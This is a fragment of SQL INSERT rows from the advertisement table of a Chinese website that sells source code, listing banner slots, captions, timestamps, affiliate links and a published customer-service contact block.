(89, '1491285941ad80', '图片', 'jpg', '第3张', 'ke_06', '', '2017-04-04 14:05:41', '', NULL, 3, 0, 0, '2045-04-04 14:05:41', 0, NULL, NULL),
(90, '1491286320ad31', '图片', 'jpg', '', 'ke_qh', '', '2017-04-04 14:12:00', '', NULL, 1, 0, 0, '2046-04-04 14:12:06', 0, NULL, NULL),
(91, '1491286351ad58', '图片', 'jpg', '', 'ke_qh', '', '2017-04-04 14:12:31', '', NULL, 2, 0, 0, '2046-04-04 14:13:09', 0, NULL, NULL),
(92, '1491287366ad69', '图片', 'jpg', '', 'ke_03', '', '2017-04-04 14:29:26', 'http://www.west.cn/?ReferenceID=1239914', NULL, 1, 0, 0, '2046-04-04 14:29:26', 0, NULL, NULL),
(93, '1491287505ad36', '图片', 'jpg', '', 'ke_02', '', '2017-04-04 14:31:45', 'http://www.west.cn/?ReferenceID=1239914', NULL, 1, 0, 0, '2039-04-04 14:31:46', 0, NULL, NULL),
(94, '1491287520ad34', '图片', 'jpg', '', 'ke_02', '', '2017-04-04 14:32:00', '', NULL, 2, 0, 0, '2030-04-04 14:32:13', 0, NULL, NULL),
(95, '1491287558ad53', '图片', 'jpg', '', 'ke_02', '', '2017-04-04 14:32:38', '', NULL, 3, 0, 0, '2036-04-04 14:32:37', 0, NULL, NULL),
(96, '1491287580ad13', '图片', 'jpg', '', 'ke_02', '', '2017-04-04 14:33:00', '', NULL, 4, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(97, '1491288361ad55', '图片', 'png', '建立网站之间各类资源买卖交易， 以此达到互相促进、共同发展；最 终达到N赢的效果。', 'ke_01', '', '2017-04-04 14:46:01', '', NULL, 1, 0, 0, '2026-04-04 14:46:26', 0, NULL, NULL),
(98, '1491288400ad95', '图片', 'png', '建立网站之间各类资源买卖交易， 以此达到互相促进、共同发展；最 终达到N赢的效果。', 'ke_01', '', '2017-04-04 14:46:40', '', NULL, 2, 0, 0, '2036-04-04 14:46:56', 0, NULL, NULL),
(99, '1491288439ad81', '图片', 'jpg', '', 'ke_01', '', '2017-04-04 14:47:19', '', NULL, 3, 0, 0, '2034-04-04 14:47:25', 0, NULL, NULL),
(100, '1491288460ad20', '图片', 'jpg', '', 'ke_01', '', '2017-04-04 14:47:40', '', NULL, 4, 0, 0, '2036-04-04 14:47:51', 0, NULL, NULL),
(101, '1491288870ad55', '图片', 'jpg', '第一张', 'ke_04', '', '2017-04-04 14:54:30', '', NULL, 1, 0, 0, '2036-04-04 14:54:25', 0, NULL, NULL),
(102, '1491288886ad8', '图片', 'jpg', '第2张', 'ke_04', '', '2017-04-04 14:54:46', '', NULL, 2, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(103, '1491288914ad95', '图片', 'jpg', '第一张', 'ke_05', '', '2017-04-04 14:55:14', '', NULL, 1, 0, 0, '2038-04-04 14:55:37', 0, NULL, NULL),
(104, '1491288985ad11', '图片', 'jpg', '第二张', 'ke_05', '', '2017-04-04 14:56:25', '', NULL, 2, 0, 0, '2041-04-04 14:56:20', 0, NULL, NULL),
(107, '1491313423ad89', '图片', 'jpg', '', 'menhu_01', '', '2017-04-04 21:43:43', '', NULL, 3, 0, 0, '2039-04-04 21:43:39', 0, NULL, NULL),
(108, '1493581890ad20', '图片', 'jpg', '9063167489', 'ADUSER1', '', '2029-05-01 03:51:30', '', NULL, 1, 0, 0, '2034-05-01 03:51:17', 0, NULL, NULL),
(111, '1497013141ad64', '图片', 'png', '', 'ADTASK02', '', '2017-06-09 20:59:01', 'task/', NULL, 1, 0, 0, '2030-06-09 20:57:59', 0, NULL, NULL),
(112, '1498555159ad47', '图片', 'jpg', '', 'ke_07', '', '2017-06-27 17:19:19', '', NULL, 1, 0, 0, '2024-06-27 17:17:56', 0, NULL, NULL),
(113, '1498648630ad7', '图片', 'png', '站酷网 | 中国最具人气的设计师互动平台国内最活跃的原创设计交流平台', 'ADI13', '', '2017-06-28 19:17:10', '', NULL, 1, 0, 0, '2041-06-28 19:15:41', 0, NULL, NULL),
(114, '1498648696ad34', '图片', 'png', '植美村 | 中国最受消费者欢迎的二十大品牌中国著名品牌之一', 'ADI13', '', '2017-06-28 19:18:16', '', NULL, 2, 0, 0, '2042-06-28 19:16:56', 0, NULL, NULL),
(115, '1498648750ad62', '图片', 'png', '上海添香 | 拥有国内顶尖整合营销团队防辐射服装行业的第一品牌', 'ADI13', '', '2017-06-28 19:19:10', '', NULL, 3, 0, 0, '2041-06-28 19:17:51', 0, NULL, NULL),
(116, '1498648817ad10', '图片', 'png', '零食够 | 各类进口食品、健康零食全球采购，吃出健康国际范', 'ADI13', '', '2017-06-28 19:20:17', '', NULL, 4, 0, 0, '2040-06-28 19:19:09', 0, NULL, NULL),
(117, '1498648881ad87', '图片', 'png', '澳优乳业 | 中国高端奶粉市场五强中唯一的奶源来自澳洲的中国品牌', 'ADI13', '', '2017-06-28 19:21:21', '', NULL, 5, 0, 0, '2036-06-28 19:20:12', 0, NULL, NULL),
(119, '1501670305ad43', '文字', '', '源码商城官网 ', 'ADI14', '', '2017-08-02 18:38:25', 'http://www.baidu.com/', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(120, '1502114146ad72', '图片', 'jpg', '', 'gao_qh', '', '2017-08-07 21:55:46', '', NULL, 1, 0, 0, '2037-08-07 21:55:44', 0, NULL, NULL),
(121, '1502114159ad41', '图片', 'jpg', '', 'gao_qh', '', '2017-08-07 21:55:59', '', NULL, 2, 0, 0, '2032-08-07 21:56:10', 0, NULL, NULL),
(122, '1502114684ad75', '图片', 'gif', '', 'ADI13', '', '2017-08-07 22:04:44', '', NULL, 6, 0, 0, '2043-08-07 22:04:45', 0, NULL, NULL),
(123, '1502114701ad61', '图片', 'gif', '', 'ADI13', '', '2017-08-07 22:05:01', '', NULL, 7, 0, 0, '2049-08-07 22:04:58', 0, NULL, NULL),
(124, '1502114712ad83', '图片', 'gif', '', 'ADI13', '', '2017-08-07 22:05:12', '', NULL, 8, 0, 0, '2040-08-07 22:05:12', 0, NULL, NULL),
(125, '1502114727ad7', '图片', 'gif', '', 'ADI13', '', '2017-08-07 22:05:27', '', NULL, 9, 0, 0, '2047-08-07 22:05:24', 0, NULL, NULL),
(126, '1502114739ad72', '图片', 'gif', '', 'ADI13', '', '2017-08-07 22:05:39', '', NULL, 10, 0, 0, '2037-08-07 22:05:39', 0, NULL, NULL),
(127, '1502788570ad9', '文字', '', '友价商城源码-多套模板自由切换', 'gao_04', '', '2017-08-15 17:16:10', 'http://www.0598128.com', NULL, 1, 0, 0, '2035-08-15 17:16:07', 0, NULL, NULL),
(128, '1502788603ad38', '文字', '', '虚拟商品跟实物交易完美结合，可实现自动发货，担保交易，资金无忧。欢迎选购友价源码', 'gao_05', '', '2017-08-15 17:16:43', 'http://www.0598128.com', NULL, 1, 0, 0, '2035-08-15 17:16:36', 0, NULL, NULL),
(129, '1502790456ad32', '图片', 'gif', '', 'gao_01', '', '2017-08-15 17:47:36', '', NULL, 1, 0, 0, '2031-08-15 17:47:23', 0, NULL, NULL),
(130, '1502795498ad27', '图片', 'jpg', '', 'xin_qh', '', '2017-08-15 19:11:38', '', NULL, 1, 0, 0, '2033-08-15 19:11:24', 0, NULL, NULL),
(131, '1502795704ad59', '图片', 'jpg', '第一张', 'xin_01', '', '2017-08-15 19:15:04', '', NULL, 1, 0, 0, '2028-08-15 19:14:49', 0, NULL, NULL),
(132, '1502795747ad26', '图片', 'jpg', '第二张', 'xin_01', '', '2017-08-15 19:15:47', '', NULL, 2, 0, 0, '2031-08-15 19:15:38', 0, NULL, NULL),
(133, '1502795761ad26', '图片', 'jpg', '第三张', 'xin_01', '', '2017-08-15 19:16:01', '', NULL, 3, 0, 0, '2035-08-15 19:16:00', 0, NULL, NULL),
(134, '1502795789ad17', '图片', 'jpg', '第四张', 'xin_01', '', '2017-08-15 19:16:29', '', NULL, 4, 0, 0, '2031-08-15 19:16:23', 0, NULL, NULL),
(135, '1502795841ad38', '图片', 'jpg', '第一张', 'xin_02', '', '2017-08-15 19:17:21', '', NULL, 1, 0, 0, '2034-08-15 19:17:06', 0, NULL, NULL),
(136, '1502795851ad41', '图片', 'jpg', '第二张', 'xin_02', '', '2017-08-15 19:17:31', '', NULL, 2, 0, 0, '2030-08-15 19:17:30', 0, NULL, NULL),
(137, '1502795904ad88', '图片', 'jpg', '第三张', 'xin_02', '', '2017-08-15 19:18:24', '', NULL, 3, 0, 0, '2038-08-15 19:18:20', 0, NULL, NULL),
(138, '1502795964ad40', '图片', 'jpg', '第四张', 'xin_02', '', '2017-08-15 19:19:24', '', NULL, 4, 0, 0, '2038-08-15 19:19:08', 0, NULL, NULL),
(139, '1502798258ad83', '图片', 'jpg', '', 'mix_03', '', '2017-08-15 19:57:38', '', NULL, 1, 0, 0, '2027-08-15 19:57:23', 0, NULL, NULL),
(140, '1502798285ad97', '图片', 'png', '', 'mix_04', '', '2017-08-15 19:58:05', '', NULL, 1, 0, 0, '2042-08-15 19:57:50', 0, NULL, NULL),
(141, '1502798296ad73', '图片', 'jpg', '', 'mix_04', '', '2017-08-15 19:58:16', '', NULL, 2, 0, 0, '2034-08-15 19:58:01', 0, NULL, NULL),
(142, '1502798307ad31', '图片', 'png', '', 'mix_04', '', '2017-08-15 19:58:27', '', NULL, 3, 0, 0, '2033-08-15 19:58:12', 0, NULL, NULL),
(143, '1502798342ad57', '图片', 'jpg', '', 'mix_02', '', '2017-08-15 19:59:02', '', NULL, 1, 0, 0, '2032-08-15 19:58:46', 0, NULL, NULL),
(144, '1502798360ad31', '图片', 'jpg', '', 'mix_02', '', '2017-08-15 19:59:20', '', NULL, 2, 0, 0, '2041-08-15 19:59:05', 0, NULL, NULL),
(149, '1503423718ad74', '图片', 'gif', '', 'gao_06', '', '2017-08-23 01:41:58', 'http://www.0598128.com', NULL, 1, 0, 0, '2037-08-23 01:42:02', 0, NULL, NULL),
(150, '1503425031ad10', '图片', 'png', '极速发货，购买后立即显示卡密信息', 'gao_03', '', '2017-08-23 02:03:51', '', NULL, 1, 0, 0, '2024-08-23 02:03:40', 0, NULL, NULL),
(151, '1503425094ad75', '图片', 'png', '所有源码均测试可用，请放心选购', 'gao_03', '', '2017-08-23 02:04:54', '', NULL, 2, 0, 0, '2032-08-23 02:04:26', 0, NULL, NULL),
(153, '1508385690ad57', '图片', 'png', '', 'nz_01', '', '2017-10-19 12:01:30', '', NULL, 2, 0, 0, '2028-10-19 12:01:35', 0, NULL, NULL),
(154, '1508385742ad57', '图片', 'jpg', '', 'nz_02', '', '2017-10-19 12:02:22', 'https://s.click.taobao.com/IHV1PZw', NULL, 1, 0, 0, '2032-10-19 12:02:26', 0, NULL, NULL),
(155, '1508385773ad17', '图片', 'jpg', '', 'nz_03', '<a href="http://www.west.cn?ReferenceID=1239914" target=_blank><img src="http://www.west.cn/vcp/vcp_img/free6/C/960x60_C.jpg" border=0></a>\r\n<a href="http://www.west.cn?ReferenceID=1239914" target=_blank><img src="http://www.west.cn/vcp/vcp_img/logo8831.gif" border=0></a>', '2017-10-19 12:02:53', '', NULL, 1, 0, 0, '2036-10-19 12:03:50', 0, NULL, NULL),
(156, '1508426338ad9', '图片', 'jpg', '', 'nz_01', '', '2017-10-19 23:18:58', '', NULL, 1, 0, 0, '2035-10-19 23:18:57', 0, NULL, NULL),
(157, '1508597699ad74', '图片', 'gif', '', 'NAZ_05', '', '2017-10-21 22:54:59', '', NULL, 1, 0, 0, '2032-10-21 22:55:01', 0, NULL, NULL),
(158, '1508598340ad30', '图片', 'jpg', '', 'NAZ_06', '', '2017-10-21 23:05:40', '', NULL, 1, 0, 0, '2033-10-21 23:05:52', 0, NULL, NULL),
(159, '1508598526ad60', '图片', 'gif', '', 'NAZ_07', '', '2017-10-21 23:08:46', '', NULL, 1, 0, 0, '2036-10-21 23:08:48', 0, NULL, NULL),
(160, '1508602946ad85', '图片', 'jpg', '', 'NAZ_04', '', '2017-10-22 00:22:26', '', NULL, 1, 0, 0, '2034-10-22 00:22:28', 0, NULL, NULL),
(161, '1508603002ad86', '图片', 'gif', '', 'NAZ_05', '', '2017-10-22 00:23:22', '', NULL, 2, 0, 0, '2027-10-22 00:23:24', 0, NULL, NULL),
(162, '1510630715ad93', '图片', 'png', '', 'gao_02', '', '2017-11-14 11:38:35', '', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(163, '1510630807ad8', '图片', 'png', '', 'gao_02', '', '2017-11-14 11:40:07', '', NULL, 2, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(164, '1510630819ad79', '图片', 'png', '', 'gao_02', '', '2017-11-14 11:40:19', '', NULL, 3, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(165, '1510630830ad40', '图片', 'png', '', 'gao_02', '', '2017-11-14 11:40:30', '', NULL, 4, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(166, '1510630840ad99', '图片', 'png', '', 'gao_02', '', '2017-11-14 11:40:40', '', NULL, 5, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(167, '1510630851ad33', '图片', 'png', '', 'gao_02', '', '2017-11-14 11:40:51', '', NULL, 6, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(168, '1510630861ad45', '图片', 'png', '', 'gao_02', '', '2017-11-14 11:41:01', '', NULL, 7, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(169, '1510630871ad71', '图片', 'png', '', 'gao_02', '', '2017-11-14 11:41:11', '', NULL, 8, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(170, '1510630946ad27', '图片', 'png', '全场包邮，每天搜罗精品供您选购', 'gao_03', '', '2017-11-14 11:42:26', '', NULL, 3, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(171, '1510630988ad93', '图片', 'png', '合作设计师原创作品，高清晰精美图片', 'gao_03', '', '2017-11-14 11:43:08', '', NULL, 4, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(196, '1517596062ad92', '图片', 'png', '', 'zh_qh', '', '2018-02-03 02:27:42', '', NULL, 2, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(194, '1515340044ad58', '图片', 'gif', '', 'NAZ_04', '', '2018-01-07 23:47:24', '', NULL, 2, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(195, '1517596037ad13', '图片', 'jpg', '', 'zh_qh', '', '2018-02-03 02:27:17', '', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(192, '1515339989ad83', '图片', 'jpg', '', 'NAZ04', '', '2018-01-07 23:46:29', '', NULL, 2, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(191, '1515339975ad73', '图片', 'jpg', '', 'NAZ04', '', '2018-01-07 23:46:15', '', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(183, '1510632661ad74', '代码', '', '官网入口', 'ADKF', '', '2017-11-14 12:11:01', '', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(190, '1510751162ad77', '文字', '', '直销系统', 'ADI14', '', '2017-11-15 21:06:02', '', NULL, 2, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(197, '1517596113ad94', '图片', 'gif', '', 'zh_01', '', '2018-02-03 02:28:33', '', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(198, '1517596156ad84', '图片', 'png', '', 'zh_02', '', '2018-02-03 02:29:16', '', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(199, '1517596322ad24', '图片', 'png', '', 'zh_02', '', '2018-02-03 02:32:02', '', NULL, 2, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(200, '1517596738ad33', '图片', 'png', '', 'zh_02', '', '2018-02-03 02:38:58', '', NULL, 3, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(201, '1517596752ad4', '图片', 'png', '', 'zh_02', '', '2018-02-03 02:39:12', '', NULL, 4, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(202, '1517596764ad27', '图片', 'png', '', 'zh_02', '', '2018-02-03 02:39:24', '', NULL, 5, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(203, '1517596855ad55', '图片', 'png', '', 'zh_02', '', '2018-02-03 02:40:55', '', NULL, 6, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(204, '1517596879ad11', '图片', 'png', '', 'zh_02', '', '2018-02-03 02:41:19', '', NULL, 7, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(205, '1517596904ad4', '图片', 'png', '', 'zh_02', '', '2018-02-03 02:41:44', '', NULL, 8, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(206, '1517626378ad88', '图片', 'jpg', '', 'zh_qh', '', '2018-02-03 10:52:58', '', NULL, 0, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(207, '1517651914ad50', '图片', 'png', '', 'zh_03', '', '2018-02-03 17:58:34', '', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(212, '1527819807ad21', '图片', 'jpg', '', 'gao_01', '', '2018-06-01 10:23:27', 'https://www.163aas.com/', NULL, 2, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(214, '1532788901ad98', '文字', '', '批量生成会员', 'ADCJ01', '', '2018-07-28 22:41:41', 'chajian_adduser.php', NULL, 1, 0, 0, '2022-07-28 22:41:39', 0, NULL, NULL),
(215, '1535476969ad30', '图片', 'png', '', 'aiyou_qh', '', '2018-08-29 01:22:49', '', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(216, '1535476982ad80', '图片', 'jpg', '', 'aiyou_qh', '', '2018-08-29 01:23:02', '', NULL, 2, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(217, '1535477004ad43', '图片', 'png', '', 'aiyou_qh', '', '2018-08-29 01:23:24', '', NULL, 3, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(218, '1535478708ad5', '图片', 'gif', '', 'aiyou_08', '', '2018-08-29 01:51:48', 'http://www.928vip.cn/', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(231, '1535972374ad61', '图片', 'jpg', '', 'ADI04', '', '2018-09-03 18:59:34', '', NULL, 3, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(221, '1535479424ad76', '图片', 'gif', '', 'aiyou_09', '', '2018-08-29 02:03:44', 'http://www.928vip.cn/', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(222, '1535479784ad54', '图片', 'gif', '', 'aiyou_10', '', '2018-08-29 02:09:44', 'http://www.928vip.cn/', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(241, '0044318001545841486', '图片', 'png', '', 'aiyou_01', '', '2018-12-27 00:24:46', '', NULL, 6, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(240, '0638069001545841476', '图片', 'png', '', 'aiyou_01', '', '2018-12-27 00:24:36', '', NULL, 5, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(239, '0763068001545841466', '图片', 'png', '', 'aiyou_01', '', '2018-12-27 00:24:26', '', NULL, 4, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(238, '0747444001545841458', '图片', 'png', '', 'aiyou_01', '', '2018-12-27 00:24:18', '', NULL, 3, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(237, '0028694001545841450', '图片', 'png', '', 'aiyou_01', '', '2018-12-27 00:24:10', '', NULL, 2, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(234, '0075569001545841302', '图片', 'jpg', '', 'aiyou_02', '', '2018-12-27 00:21:42', '', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(235, '0122443001545841314', '图片', 'jpg', '', 'aiyou_02', '', '2018-12-27 00:21:54', '', NULL, 2, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(236, '0841194001545841382', '图片', 'png', '', 'aiyou_01', '', '2018-12-27 00:23:02', '', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(242, '0763069001545841495', '图片', 'png', '', 'aiyou_01', '', '2018-12-27 00:24:55', '', NULL, 7, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(243, '0091194001545841505', '图片', 'png', '', 'aiyou_01', '', '2018-12-27 00:25:05', '', NULL, 8, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(245, '0950570001545842101', '代码', '', '', 'aiyou_03', 'Q Q：249294043<br>\r\n电话：18673809841<br>\r\n邮箱：249294043@qq.com<br>\r\n时间：09:00 - 19:00', '2018-12-27 00:35:01', '', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(246, '0106819001545842152', '图片', 'jpg', '微信扫描关注我们', 'aiyou_04', '', '2018-12-27 00:35:52', '', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(247, '0716194001545842520', '图片', 'png', '', 'aiyou_05', '', '2018-12-27 00:42:00', '', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(248, '0763070001545842534', '图片', 'png', '', 'aiyou_05', '', '2018-12-27 00:42:14', '', NULL, 2, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(249, '0216194001545842543', '图片', 'jpg', '', 'aiyou_05', '', '2018-12-27 00:42:23', '', NULL, 3, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(250, '0809944001545842554', '图片', 'png', '', 'aiyou_05', '', '2018-12-27 00:42:34', '', NULL, 4, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(252, '0591193001545842567', '图片', 'jpg', '', 'aiyou_05', '', '2018-12-27 00:42:47', '', NULL, 5, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(254, '0893620001559929373', '图片', 'jpg', '', 'zhisuym_02', '', '2019-06-08 01:42:53', '', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(255, '0233782001559929384', '图片', 'jpg', '', 'zhisuym_02', '', '2019-06-08 01:43:04', '', NULL, 2, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(256, '0638112001559929599', '图片', 'png', '', 'zhisuym_01', '', '2019-06-08 01:46:39', '', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(257, '0503569001559929611', '图片', 'png', '', 'zhisuym_01', '', '2019-06-08 01:46:51', '', NULL, 2, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(258, '0115140001559929623', '图片', 'png', '', 'zhisuym_01', '', '2019-06-08 01:47:03', '', NULL, 3, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(259, '0425160001559929631', '图片', 'png', '', 'zhisuym_01', '', '2019-06-08 01:47:11', '', NULL, 4, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(270, '0513567001560017659', '图片', 'jpg', '', 'zhisuym_06', '', '2019-06-09 02:14:19', '', NULL, 3, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(269, '0070967001560017649', '图片', 'png', '', 'zhisuym_06', '', '2019-06-09 02:14:09', '', NULL, 2, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(263, '0074947001559930138', '图片', 'png', '', 'zhisuym', '', '2019-06-08 01:55:38', '', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(264, '0019435001559930151', '图片', 'png', '', 'zhisuym', '', '2019-06-08 01:55:51', '', NULL, 2, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(265, '0915353001559930159', '图片', 'png', '', 'zhisuym', '', '2019-06-08 01:55:59', '', NULL, 3, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(266, '0727759001559998629', '图片', 'jpg', '', 'zhisuym_02', '', '2019-06-08 20:57:09', '', NULL, 3, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(267, '0617933001559998971', '图片', 'jpg', '知速源码', 'news_04', '', '2019-06-08 21:02:51', '/news/', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(268, '0306957001560017521', '图片', 'jpg', '', 'zhisuym_06', '', '2019-06-09 02:12:01', '', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(271, '0507835001560017670', '图片', 'jpg', '', 'zhisuym_06', '', '2019-06-09 02:14:30', '', NULL, 4, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(311, '0904430001560491717', '图片', 'jpg', '', 'gao_qh', '', '2019-06-14 13:55:17', '', NULL, 3, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(312, '0757913001560492056', '图片', 'jpg', '', '928vip_qh', '', '2019-06-14 14:00:56', '', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(273, '0405229001560054064', '图片', 'jpg', '', 'ADI00', '', '2019-06-09 12:21:04', 'https://cloud.tencent.com/act/cps/redirect?redirect=1044&amp;cps_key=ae0cbf12e817248e85013e4abaf28cfb&amp;from=console', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(274, '0930061001560089622', '图片', 'jpg', '首页切换1', 'shun_qh', '', '2019-06-09 22:13:42', 'http://www.zhisuym.com/', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(275, '0138293001560089645', '图片', 'jpg', '首页切换2', 'shun_qh', '', '2019-06-09 22:14:05', 'http://www.zhisuym.com/', NULL, 2, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(276, '0583013001560089707', '图片', 'jpg', '首页商品列表左侧1', 'shun_01', '', '2019-06-09 22:15:07', 'http://www.zhisuym.com/', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(277, '0902226001560089731', '图片', 'jpg', '首页商品列表左侧2', 'shun_01', '', '2019-06-09 22:15:31', 'http://www.zhisuym.com/', NULL, 2, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(278, '0608585001560089753', '图片', 'jpg', '首页商品列表左侧2', 'shun_01', '', '2019-06-09 22:15:53', 'http://www.zhisuym.com/', NULL, 3, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(279, '0947465001560089788', '图片', 'jpg', '首页商品列表左侧下1', 'shun_02', '', '2019-06-09 22:16:28', 'http://www.zhisuym.com/', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(280, '0754226001560089811', '图片', 'png', '首页商品列表左侧下2', 'shun_02', '', '2019-06-09 22:16:51', 'http://www.zhisuym.com/', NULL, 2, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(281, '0055396001560089827', '图片', 'jpg', '首页商品列表左侧下3', 'shun_02', '', '2019-06-09 22:17:07', 'http://www.zhisuym.com/', NULL, 3, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(282, '0909250001560089989', '图片', 'jpg', '切换下方小图1', 'shun_06', '', '2019-06-09 22:19:49', 'http://www.zhisuym.com/', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(283, '0645173001560090027', '图片', 'png', '切换下方小图2', 'shun_06', '', '2019-06-09 22:20:27', 'http://www.zhisuym.com/', NULL, 2, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(284, '0059439001560090044', '图片', 'jpg', '切换下方小图3', 'shun_06', '', '2019-06-09 22:20:44', 'http://www.zhisuym.com/', NULL, 3, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(285, '0912116001560090060', '图片', 'jpg', '切换下方小图4', 'shun_06', '', '2019-06-09 22:21:00', 'http://www.zhisuym.com/', NULL, 4, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(287, '0130443001560090240', '图片', 'jpg', '切换下方小图5', 'shun_06', '', '2019-06-09 22:24:00', 'http://www.zhisuym.com/', NULL, 5, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(288, '0047871001560092378', '图片', 'jpg', '热门商品下方横幅', 'shun_03', '', '2019-06-09 22:59:38', 'http://www.zhisuym.com/', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(291, '0621817001560112831', '图片', 'png', '', '928vip_06', '', '2019-06-10 04:40:31', '', NULL, 1, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(297, '0918850001560113145', '图片', 'png', '', '928vip_06', '', '2019-06-10 04:45:45', '', NULL, 2, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(298, '0706767001560113163', '图片', 'png', '', '928vip_06', '', '2019-06-10 04:46:03', '', NULL, 3, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(299, '0918295001560113184', '图片', 'png', '', '928vip_06', '', '2019-06-10 04:46:24', '', NULL, 4, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(300, '0572495001560113201', '图片', 'png', '', '928vip_06', '', '2019-06-10 04:46:41', '', NULL, 5, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(301, '0557731001560113218', '图片', 'png', '', '928vip_06', '', '2019-06-10 04:46:58', '', NULL, 6, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(302, '0005954001560113234', '图片', 'png', '', '928vip_06', '', '2019-06-10 04:47:14', '', NULL, 7, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
(303, '0700652001560113258', '图片', 'png', '', '928vip_06', '', '2019-06-10 04:47:38', '', NULL, 8, 0, 0, '2049-09-09 09:09:09', 0, NULL, NULL),
